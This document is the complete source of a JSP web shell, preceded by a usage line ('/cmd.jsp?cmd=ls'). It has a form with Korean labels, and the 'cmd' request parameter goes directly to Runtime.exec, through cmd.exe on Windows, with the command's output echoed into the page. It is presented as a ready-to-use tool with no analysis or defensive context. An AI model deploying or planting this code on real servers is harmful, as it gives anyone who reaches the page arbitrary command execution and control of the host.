<pre>
example : /cmd.jsp?cmd=ls 

<%@ page import="java.util.*,java.io.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
</head>


<textarea>      
<body>
<form method="GET" name="cmdForm" action="">
<input type="text" name="cmd">
<input type="submit" value="전송">
</form>

<%
if (request.getParameter("cmd") != null)
{
	out.println("명령어 : " + request.getParameter("cmd") + "<br>");
	
	Process p;
	
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
		p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    
    else
		p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	
	InputStreamReader in = new InputStreamReader(p.getInputStream(),"euc-kr");
	BufferedReader br = new BufferedReader(in);
	
	String disr = br.readLine();
	
	while ( disr != null )
	{
		out.println(disr); 
		disr = br.readLine(); 
	}
}
%>
</textarea>
</body>
</html>
</pre>
